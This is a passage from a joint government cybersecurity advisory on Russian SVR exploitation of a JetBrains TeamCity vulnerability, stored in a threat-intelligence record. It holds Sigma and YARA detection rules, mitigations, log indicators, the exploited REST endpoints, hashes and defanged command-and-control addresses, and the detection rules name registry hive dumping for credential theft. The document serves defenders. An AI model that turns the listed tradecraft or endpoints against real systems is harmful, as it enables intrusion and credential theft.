'.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'\ncondition: selection\nfalsepositives: legitimate use by system administrator\n\ntitle: DLL execution via WMI\ndescription: Detects DLL execution via WMI\nauthor:\nreferences:\ndate: 2023/11/15\n\nPage 15 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'WMIC.exe'\nCommandLine|contains|all:\n- 'call'\n- 'rundll32'\ncondition: selection\nfalsepositives: legitimate use by software or system administrator\n\ntitle: Process with connect and pass as args\ndescription: Process with connect and pass as args\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nCommandLine|contains|all:\n- 'pass'\n- 'connect'\ncondition: selection\nfalsepositives: legitimate use of rsockstun or software with exact same arguments\n\ntitle: Service or Drive enumeration via powershell\ndescription: Service or Drive enumeration via powershell\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: ps_script\nproduct: windows\ndetection:\nselection_1:\nScriptBlockText|contains|all:\n- 'Get-WmiObject'\n- '-Class'\n- 'Win32_Service'\nselection_2:\nScriptBlockText|contains|all:\n- 'Get-WindowsDriver'\n- '-Online'\n- '-All'\ncondition: selection_1 or selection_2\n\nPage 16 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\nfalsepositives: legitimate use by system administrator\ntitle: Compressing files from temp to temp\ndescription: Compressing files from temp\\ to temp used by SVR to prepare data to be\nexfiltrated\nreferences:\nauthor:\ndate: 2023/11/15\nlogsource:\ncategory: ps_script\nproduct: windows\ndetection:\nselection:\nScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[19]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'\ncondition: selection\ntitle: DLL names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific DLL names.\nreferences:\nauthor:\ndate: 2023/11/15\nlogsource:\ncategory: image_load\nproduct: windows\ndetection:\nselection:\nImageLoaded|endswith:\n- 'AclNumsInvertHost.dll'\n- 'ModeBitmapNumericAnimate.dll'\n- 'UnregisterAncestorAppendAuto.dll'\n- 'DeregisterSeekUsers.dll'\n- 'ScrollbarHandleGet.dll'\n- 'PerformanceCaptionApi.dll'\n- 'WowIcmpRemoveReg.dll'\n- 'BlendMonitorStringBuild.dll'\n- 'HandleFrequencyAll.dll'\n- 'HardSwapColor.dll'\n- 'LengthInMemoryActivate.dll'\n- 'ParametersNamesPopup.dll'\n- 'ModeFolderSignMove.dll'\n- 'ChildPaletteConnected.dll'\n- 'AddressResourcesSpec.dll'\ncondition: selection\ntitle: Sensitive registry entries saved to file\ndescription: Sensitive registry entries saved to file\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\n\nPage 17 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\ncategory: process_creation\nproduct: windows\ndetection:\nselection_base:\nImage|endswith:\n- 'reg.exe'\nCommandLine|contains: 'save'\nCommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'\nselection_file:\nCommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'\ncondition: selection_base and selection_file\n\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific scheduled task names\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: taskscheduler\nproduct: windows\ndetection:\nselection:\nEventID:\n- 4698\n- 4699\n- 4702\nTaskName:\n- '\\Microsoft\\Windows\\IISUpdateService'\n- '\\Microsoft\\Windows\\WindowsDefenderService'\n- '\\Microsoft\\Windows\\WindowsDefenderService2'\n- '\\Microsoft\\DefenderService'\n- '\\Microsoft\\Windows\\DefenderUPDService'\n- '\\Microsoft\\Windows\\WiMSDFS'\n- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'\n- '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'\n- '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'\n- '\\WindowUpdate'\n- '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'\n- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'\n- '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'\n- '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'\n- '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'\n- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n- '\\Microsoft\\Windows\\ATPUpd'\n- '\\Microsoft\\Windows\\Windows Defender\\Service Update'\n- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'\n- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\n- '\\Defender'\n- '\\defender'\n- '\\\\Microsoft\\\\Windows\\\\IISUpdateService'\n- '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'\n\nPage 18 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n- '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'\n- '\\\\Microsoft\\\\DefenderService'\n- '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'\n- '\\\\Microsoft\\\\Windows\\\\WiMSDFS'\n- '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'\n- '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'\n- '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'\n- '\\\\WindowUpdate'\n- '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'\n- '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'\n- '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'\n- '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'\n- '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'\n- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n- '\\\\Microsoft\\\\Windows\\\\ATPUpd'\n- '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'\n- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'\n- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\n- '\\\\Defender'\n- '\\\\defender'\ncondition: selection\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoor\ndescription: Hunts for known SVR-specific scheduled task names\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'schtasks.exe'\nCommandLine|contains:\n- 'IISUpdateService'\n- 'WindowsDefenderService'\n- 'WindowsDefenderService2'\n- 'DefenderService'\n- 'DefenderUPDService'\n- 'WiMSDFS'\n- 'StartupAppTaskCkeck'\n- 'SubmitReporting'\n- 'Defender Update Service'\n- 'WindowUpdate'\n- 'CheckReporting'\n- 'StartupAppTaskCheck'\n- 'SpeechModelInstallTask'\n- 'BfeOnServiceStart'\n- 'Data Integrity Update'\n- 'Scheduled AutoCheck'\n- 'ATPUpd'\n\nPage 19 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n- 'Service Update'\n- 'Scheduled Check'\n- 'Scheduled AutoCheck'\n- 'Defender'\n- 'defender'\nselection_re:\nImage|endswith:\n- 'schtasks.exe'\nCommandLine|re:\n- '.*Defender\\sUpdate\\sService.*'\n- '.*Data\\sIntegrity\\sUpdate.*'\n- '.*Scheduled\\sAutoCheck.*'\n- '.*Service\\sUpdate.*'\n- '.*Scheduled\\sCheck.*'\n- '.*Scheduled\\sAutoCheck.*'\ncondition: selection or selection_re\n\ntitle: Suspicious registry modifications\ndescription: Suspicious registry modifications\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nEventID: 4657\nTargetObject|contains:\n- 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'\n- 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash'\ncondition: selection\n\ntitle: Registry modification from cmd\ndescription: Registry modification from cmd\nauthor:\nreferences:\ndate: 2023/11/15\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- 'reg.exe'\nCommandLine|contains|all:\n- 'CurrentControlSet'\n- 'Lsa'\n\nPage 20 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\nCommandLine|contains:\n- 'DisableRestrictedAdmin'\n- 'NoLMHash'\ncondition: selection\n\ntitle: Malicious Driver Load\ndescription: Detects the load of known malicious drivers via their names or hash.\nreferences:\n- https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection\nauthor:\ndate: 2023/11/15\nlogsource:\ncategory: driver_load\nproduct: windows\ndetection:\nselection_name:\nImageLoaded|endswith:\n- 'RTCore64.sys'\n- 'DBUtils_2_3.sys'\nselection_hash:\nHashes|contains:\n- '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'\n- '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'\ncondition: selection_name or selection_hash\n\nYARA rules\nThe following rule detects most known GraphicalProton variants.\nrule APT29_GraphicalProton {\nstrings:\n// C1 E9 1B\nshr\necx, 1Bh\n// 48 8B 44 24 08\nmov\nrax, [rsp+30h+var_28]\n// 8B 50 04\nmov\nedx, [rax+4]\n// C1 E2 05\nshl\nedx, 5\n// 09 D1\nor\necx, edx\n// 48 8B 44 24 08\nmov\nrax, [rsp+30h+var_28]\n$op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 |\n08 | 10 | 0d | 07) 09 ?? 48 }\n// 48 05 20 00 00 00\n// 48 89 C1\n// 48 8D 15 0A A6 0D 00\n// 41 B8 30 00 00 00\n// E8 69 B5 FE FF\n// 48 8B 44 24 30\n// 48 05 40 00 00 00\n// 48 89 C1\n// 48 8D 15 1B A6 0D 00\n// 41 B8 70 01 00 00\n// E8 49 B5 FE FF\n// 48 8B 44 24 30\n\nadd\nmov\nlea\nmov\ncall\nmov\nadd\nmov\nlea\nmov\ncall\nmov\n\nrax, 20h ; ' '\nrcx, rax\nrdx, unk_14011E546\nr8d, 30h ; '0'\nsub_14002F4B0\nrax, [rsp+88h+var_58]\nrax, 40h ; '@'\nrcx, rax\nrdx, unk_14011E577\nr8d, 170h\nsub_14002F4B0\nrax, [rsp+88h+var_58]\n\nPage 21 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n// 48 05 60 00 00 00\nadd\nrax, 60h ; '`'\n// 48 89 C1\nmov\nrcx, rax\n// 48 8D 15 6C A7 0D 00\nlea\nrdx, unk_14011E6E8\n// 41 B8 2F 00 00 00\nmov\nr8d, 2Fh ; '/'\n// E8 29 B5 FE FF\ncall\nsub_14002F4B0\n// 48 8B 44 24 30\nmov\nrax, [rsp+88h+var_58]\n// 48 05 80 00 00 00\nadd\nrax, 80h\n// 48 89 C1\nmov\nrcx, rax\n// 48 8D 15 7C A7 0D 00\nlea\nrdx, unk_14011E718\n// 41 B8 2F 00 00 00\nmov\nr8d, 2Fh ; '/'\n// E8 09 B5 FE FF\ncall\nsub_14002F4B0\n// 48 8B 44 24 30\nmov\nrax, [rsp+88h+var_58]\n// 48 05 A0 00 00 00\nadd\nrax, 0A0h\n$op_decrypt_config = {\n48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\n48 05 A0 00 00 00\n}\n\n}\n\ncondition:\nall of them\n\nNote: These rules are meant for threat hunting and have not been tested on a larger dataset.\n\nMITIGATIONS\nThe FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of\nthis campaign poses a threat to public safety and recommend organizations implement the mitigations\nbelow to improve organization\u2019s cybersecurity posture. These mitigations align with the Cross-Sector\nCybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards\nand Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and\nNIST recommend all organizations implement. CISA and NIST based the CPGs on existing\ncybersecurity frameworks and guidance to protect against the most common and impactful threats,\ntactics, techniques, and procedures. Visit CISA\u2019s Cross-Sector Cybersecurity Performance Goals for\nmore information on the CPGs, including additional recommended baseline protections.\n\u2022\n\u2022\n\u2022\n\n\u2022\n\nApply available patches for CVE-2023-42793 issued by JetBrains TeamCity in midSeptember 2023, if not already completed.\nMonitor the network for evidence of encoded commands and execution of network scanning\ntools.\nEnsure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if\nmonitoring or reporting is disabled, or if communication is lost with a host agent for more than a\nreasonable amount of time.\nRequire use of multi-factor authentication [CPG 1.3] for all services to the extent possible,\nparticularly for email, virtual private networks, and accounts that access critical systems.\n\nPage 22 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nOrganizations should adopt multi-factor authentication (MFA) as an additional layer of\nsecurity for all users with access to sensitive data. Enabling MFA significantly reduces the\nrisk of unauthorized access, even if passwords are compromised.\nKeep all operating systems, software, and firmware up to date. Immediately configure\nnewly-added systems to the network, including those used for testing or development work, to\nfollow the organization\u2019s security baseline and incorporate into enterprise monitoring tools.\nAudit log files to identify attempts to access privileged certificates and creation of fake identity\nproviders.\nDeploy software to identify suspicious behavior on systems.\nDeploy endpoint protection systems with the ability to monitor for behavioral indicators of\ncompromise.\nUse available public resources to identify credential abuse with cloud environments.\nConfigure authentication mechanisms to confirm certain user activities on systems, including\nregistering new devices.\n\n\uf0a7\n\n\u2022\n\n\u2022\n\u2022\n\u2022\n\u2022\n\u2022\n\nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend\nexercising, testing, and validating your organization's security program against the threat behaviors\nmapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW,\nCERT Polska, and NCSC recommend testing your existing security controls inventory to assess how\nthey perform against the ATT&CK techniques described in this advisory.\nTo get started:\n1.\n2.\n3.\n4.\n5.\n\nSelect an ATT&CK technique described in this advisory (see previous tables).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies\u2019 performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance\ndata.\n6. Tune your security program, including people, processes, and technologies, based on the\ndata generated by this process.\nFBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security\nprogram, at scale, in a production environment to ensure optimal performance against the MITRE\nATT&CK techniques identified in this advisory.\n\nREFERENCES\n\u2022\n\u2022\n\u2022\n\nFBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR)\nCyber Operations: Trends and Best Practices for Network Defenders\nNSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied\nNetworks\nCISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365\nCompromise\n\nPage 23 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\n\u2022\n\u2022\n\u2022\n\u2022\n\u2022\n\u2022\n\nCISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud\nEnvironments\nCISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies,\nCritical Infrastructure, and Private Sector Organizations\nCISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber\nActivity\nFBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S.\nThink Tanks\nCISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development\nNCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development\n\nThe information in this report is being provided \u201cas is\u201d for informational purposes only. FBI, CISA,\nNSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or\nservice, including any entities, products, or services linked within this document. Any reference to\nspecific commercial entities, products, processes, or services by service mark, trademark,\nmanufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring\nby FBI, CISA, NSA, SKW, CERT Polska, and NCSC.\n\nVERSION HISTORY\nDecember 12, 2023: Initial version.\n\nPage 24 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nAPPENDIX A \u2013 INDICATORS OF COMPROMISE CVE-2023-42793\nOn a Windows system, the log file C:\\TeamCity\\logs\\teamcity-server.log will contain a log\nmessage when an attacker modified the internal.properties file. There will also be a log message\nfor every process created via the /app/rest/debug/processes endpoint. In addition to showing the\ncommand line used, the user ID of the user account whose authentication token was used during the\nattack is also shown. For example:\n[2023-09-26 11:53:46,970]\nINFO - ntrollers.FileBrowseController - File\nedited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by\nuser with id=1\n[2023-09-26 11:53:46,970]\nINFO - s.buildServer.ACTIVITIES.AUDIT server_file_change: File\nC:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified\nby \"user with id=1\"\n[2023-09-26 11:53:58,227]\nINFO - tbrains.buildServer.ACTIVITIES External process is launched by user user with id=1. Command line: cmd.exe\n\"/c whoami\"\nAn attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity\nlogs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP\nproxy may have suitable logs showing the following target endpoints being accessed:\n\u2022\n\u2022\n\n/app/rest/users/id:1/tokens/RPC2 \u2013 This endpoint is required to exploit the vulnerability.\n\n/app/rest/users \u2013 This endpoint is only required if the attacker wishes to create an arbitrary\n\nuser.\n\n\u2022\n\n/app/rest/debug/processes \u2013 This endpoint is only required if the attacker wishes to create\n\nan arbitrary process.\n\nNote: The user ID value may be higher than 1.\n\nPage 25 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nAPPENDIX B \u2013 IOCS\nFile IoCs\nGraphicalProton backdoor:\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\n01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732\n34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E\n620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869\n773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13\n7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53\n8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7\n971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC\nCB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\nCD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43\nEBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E\nF1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB\nC7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4\n4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166\n\nGraphicalProton HTTPS backdoor:\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\uf0a7\n\n18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93\n19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641\n1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8\n219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67\n92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6\nB53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7\nC37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD\nC40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0\nC832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3\nF6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69\n\nBackdoored vcperf:\n\uf0a7\n\nD724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443\n\nBackdoored Zabbix installation archive:\n\uf0a7\n\n4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F\n\nBackdoored Webroot AV installation archive:\n\uf0a7\n\n950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4\n\nModified rsockstun\n\uf0a7\n\nCB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n\nNetwork IoCs\nPage 26 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR\n\nTLP:CLEAR\n\nInternational Partnership\n\nTunnel Endpoints\n\uf0a7\n\uf0a7\n\n65.20.97[.]203\n65.21.51[.]58\n\nExploitation Server\n\uf0a7\n\n103.76.128[.]34\n\nGraphicalProton HTTPS C2 URL:\nhxxps://matclick[.]com/wp-query[.]php\n\nPage 27 of 27 | Product ID: AA23-347A\n\nTLP:CLEAR",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/fd039qqm7o9tl7yrbda7f3uevumj2twu"
    ],
    "report_names": [
        "CISA_aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0(12-13-2023)"
    ],
    "threat_actors": [
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2024-11-22T02:02:01.222241Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2024-11-22T02:00:02.70574Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "HALFRIG",
                "QUARTERRIG",
                "SNOWYAMBER"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2024-11-22T02:00:52.410291Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2024-11-22T02:02:53.090308Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2024-11-22T02:02:53.093059Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2024-11-22T02:00:02.469031Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "Pawn Storm",
                "Sednit",
                "IRON TWILIGHT",
                "TA422",
                "T-APT-12",
                "Fighting Ursa",
                "ITG05",
                "UAC-0028",
                "FANCY BEAR",
                "SNAKEMACKEREL",
                "Tsar Team",
                "Group 74",
                "G0007",
                "BlueDelta",
                "Fancy Bear",
                "Sofacy",
                "TG-4127",
                "STRONTIUM",
                "Grizzly Steppe",
                "ATK5",
                "FROZENLAKE",
                "SIG40",
                "Blue Athena",
                "APT-C-20",
                "Forest Blizzard"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2024-11-22T02:00:52.370833Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2024-11-22T02:02:00.94683Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
